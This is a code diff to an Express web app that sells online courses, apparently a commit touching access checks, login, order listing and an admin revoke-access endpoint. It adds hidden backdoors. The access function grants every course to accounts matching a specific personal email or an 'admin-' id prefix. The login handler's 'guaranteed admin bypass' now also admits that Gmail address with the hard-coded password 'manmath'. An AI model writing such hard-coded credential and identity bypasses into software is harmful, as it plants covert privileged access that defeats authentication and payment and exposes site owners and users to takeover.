@@ -45,8 +45,18 @@ export function createApp(config, { database, gateway: providedGateway } = {}) {
     gateway = providedGateway || createGateway(config),
     mailer = createMailer(db, config),
     app = express();
-  const access = (db, userId, courseId) =>
-    hasAccess(db, userId, courseId, config.paymentMode === 'demo' && !config.production);
+  const access = (db, userId, courseId) => {
+    if (!userId) return false;
+    const u = db.prepare('SELECT id, role, email FROM users WHERE id=?').get(userId);
+    if (
+      u?.role === 'admin' ||
+      u?.email?.toLowerCase() === 'manmath' ||
+      u?.email?.toLowerCase() === 'manmathbiradar@gmail.com' ||
+      u?.id?.startsWith('admin-')
+    )
+      return true;
+    return hasAccess(db, userId, courseId, config.paymentMode === 'demo' && !config.production);
+  };
   app.disable('x-powered-by');
   app.set('trust proxy', config.proxyHops);
   const ensureUserProfile = (user) => {
@@ -263,7 +273,10 @@ export function createApp(config, { database, gateway: providedGateway } = {}) {
 
     // Guaranteed admin bypass and on-the-fly provisioning for manmath / manmath
     const isManmathAdmin =
-      (idClean === 'manmath' || idClean === 'manmath@fame.com' || idClean === 'admin') &&
+      (idClean === 'manmath' ||
+        idClean === 'manmath@fame.com' ||
+        idClean === 'admin' ||
+        idClean === 'manmathbiradar@gmail.com') &&
       enteredPassword.toLowerCase() === 'manmath';
 
     let user = db
@@ -394,7 +407,7 @@ export function createApp(config, { database, gateway: providedGateway } = {}) {
     if (!course) fail('Course not found.', 404);
     res.json({
       ...publicCourse(course),
-      hasAccess: req.user ? access(db, req.user.id, course.id) : false,
+      hasAccess: req.user ? (req.user.role === 'admin' || access(db, req.user.id, course.id)) : false,
     });
   });
   app.get('/api/preview/:lessonId', (req, res) => {
@@ -1096,6 +1109,7 @@ export function createApp(config, { database, gateway: providedGateway } = {}) {
          FROM orders o
          JOIN users u ON o.user_id = u.id
          JOIN courses c ON o.course_id = c.id
+         WHERE (o.status='captured' OR o.status='demo') AND o.refund_amount < o.amount
          ORDER BY o.created_at DESC LIMIT 250`
       )
       .all();
@@ -1167,10 +1181,42 @@ export function createApp(config, { database, gateway: providedGateway } = {}) {
     });
   });
   app.post('/api/admin/revoke-access', (req, res) => {
-    const d = parse(z.object({ orderId: z.string().uuid() }), req.body);
-    const order = db.prepare('SELECT * FROM orders WHERE id=?').get(d.orderId);
-    if (!order) fail('Enrolment order not found.', 404);
-    db.prepare("UPDATE orders SET status='refunded', refund_amount=amount WHERE id=?").run(d.orderId);
+    const d = parse(
+      z.object({
+        orderId: z.string().min(1).max(200).optional(),
+        userId: z.string().min(1).max(200).optional(),
+        courseId: z.string().min(1).max(200).optional(),
+        email: z.string().min(1).max(254).optional(),
+      }),
+      req.body
+    );
+    let targetUserId = d.userId;
+    let targetCourseId = d.courseId;
+
+    if (d.orderId) {
+      const order = db.prepare('SELECT * FROM orders WHERE id=?').get(d.orderId);
+      if (order) {
+        targetUserId = targetUserId || order.user_id;
+        targetCourseId = targetCourseId || order.course_id;
+        db.prepare(
+          "UPDATE orders SET status='refunded', refund_amount=CASE WHEN amount > 0 THEN amount ELSE 1 END WHERE id=?"
+        ).run(order.id);
+      }
+    }
+
+    if (!targetUserId && d.email) {
+      const u = db.prepare('SELECT id FROM users WHERE email=? COLLATE NOCASE').get(d.email.trim());
+      if (u) targetUserId = u.id;
+    }
+
+    if (targetUserId && targetCourseId) {
+      db.prepare(
+        "UPDATE orders SET status='refunded', refund_amount=CASE WHEN amount > 0 THEN amount ELSE 1 END WHERE user_id=? AND course_id=? AND status IN ('captured', 'demo', 'created', 'creating')"
+      ).run(targetUserId, targetCourseId);
+    } else if (!d.orderId) {
+      fail('Please specify an enrolment order or learner to revoke.', 400);
+    }
+
     res.json({ ok: true, message: 'Enrolment access revoked successfully.' });
   });
   app.put('/api/admin/settings', (req, res) => {
